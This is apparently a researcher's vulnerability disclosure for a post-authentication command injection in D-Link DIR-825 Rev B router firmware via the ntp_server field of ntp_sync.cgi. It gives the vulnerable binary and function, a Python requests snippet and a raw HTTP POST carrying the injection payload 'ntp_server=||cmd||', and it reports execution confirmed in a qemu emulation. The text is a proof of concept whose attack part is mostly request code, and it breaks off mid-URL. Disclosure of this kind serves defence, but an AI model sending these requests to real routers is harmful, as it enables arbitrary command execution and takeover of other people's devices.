### command injection
```
there is a command injection vulnerability that can cause any system command to be executed after user authentication 

download link: ftp://ftp2.dlink.com/SECURITY_ADVISEMENTS/DIR-825/REVB/

Vulnerability location: file:  /sbin/httpd  function:sub_414134 ntp_sync.cgi

The attacker calls this function by sending a post packet to the http://ip/ ntp_sync.cgi page.

The program will call the system function with the value of ntp_server in the post package.

```

```
Post package structure
postData = {
	' ntp_server ':cmd
	}
response = requests.post('http://192.168.0.1/ntp_sync.cgi ',data=postData)

```

```
Http message:
POST /ntp_sync.cgi  HTTP/1.1
Host: 192.168.113.130
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.113.130/
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
ntp_server=||cmd||

```
![images](https://github.com/WhooAmii/whooamii.github.io/blob/master/2018/DIR-825/11.png)

![images](https://github.com/WhooAmii/whooamii.github.io/blob/master/2018/DIR-825/12.png)

This is the result I got from the qemu simulation environment. 	The input parameters are executed by the system function.

![images](https://github.com/WhooAmii/whooamii.github.io/blob/master/2018/DIR-825/13.pn
